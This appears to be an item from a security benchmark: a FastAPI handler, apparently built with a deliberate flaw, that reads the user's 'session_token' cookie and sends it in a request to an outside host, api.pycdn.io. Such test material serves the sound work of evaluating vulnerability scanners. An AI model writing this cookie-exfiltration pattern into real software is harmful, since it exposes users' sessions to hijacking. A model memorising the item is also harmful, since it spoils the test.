# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests
import asyncio


async def BenchmarkTest10509(request: Request):
    cookie_value = request.cookies.get('session_token', '')
    async def fetch_payload():
        await asyncio.sleep(0)
        return cookie_value
    data = await fetch_payload()
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=True)
    return {"updated": True}
